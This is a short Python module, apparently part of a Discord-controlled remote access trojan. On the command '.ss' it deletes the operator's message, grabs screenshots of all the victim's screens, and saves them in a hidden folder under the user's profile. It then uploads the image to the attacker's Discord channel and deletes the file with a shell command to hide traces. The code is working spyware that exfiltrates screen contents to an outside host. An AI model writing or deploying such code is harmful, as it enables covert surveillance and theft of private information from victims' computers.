from resources.misc import *
from PIL import ImageGrab
import subprocess
# end of imports

# on message
elif message.content == '.ss':
    await message.delete()
    ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
    reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
    await reaction_msg.add_reaction('📌')

    subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
